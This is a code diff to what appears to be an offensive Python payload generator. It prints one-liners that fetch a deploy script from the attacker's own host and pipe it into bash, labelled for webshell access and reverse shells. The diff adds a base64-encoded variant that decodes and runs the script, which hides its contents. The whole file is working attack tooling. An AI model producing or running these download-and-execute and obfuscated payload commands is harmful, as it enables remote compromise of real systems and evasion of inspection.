@@ -6,6 +6,7 @@ import urllib.request
 import random
 import os
 import sys
+import base64
 
 # Path Setup
 
@@ -57,10 +58,13 @@ def generate_payload(template=DEFAULT_TEMPLATE, host=pull_ip(), port="8000"):
 
     url = f"http://{host}:{port}/deploy/{file_name}"
 
+    base64_payload = base64.b64encode(deploy_script.encode()).decode()
+
     execution_methods = {
         0 : ("Background exec, for webshell access -> $ ", f"{BLUE}nohup bash -c 'curl -sSL {url}|bash' &>/dev/null &{RESET}"),
         1 : ("Timed execution, for reverse shells -> $ ", f"{BLUE}timeout 60 curl -sSL {url}|bash{RESET}"),
-        2 : ("One liner with utility check & exec -> $ ", f"{BLUE}(command -v curl >/dev/null 2>&1 && curl -fsSL {url}|bash) || (command -v wget >/dev/null 2>&1 && wget -qO- {url}|bash) || (busybox wget -qO- {url}|bash){RESET}")
+        2 : ("One liner with utility check & exec -> $ ", f"{BLUE}(command -v curl >/dev/null 2>&1 && curl -fsSL {url}|bash) || (command -v wget >/dev/null 2>&1 && wget -qO- {url}|bash) || (busybox wget -qO- {url}|bash){RESET}"),
+        3 : ("Base64 encoded condensed script -> $ ", f"{BLUE}echo '{base64_payload}'|base64 -d|bash{RESET}")
     }
 
     for index in range(0, len(execution_methods)):
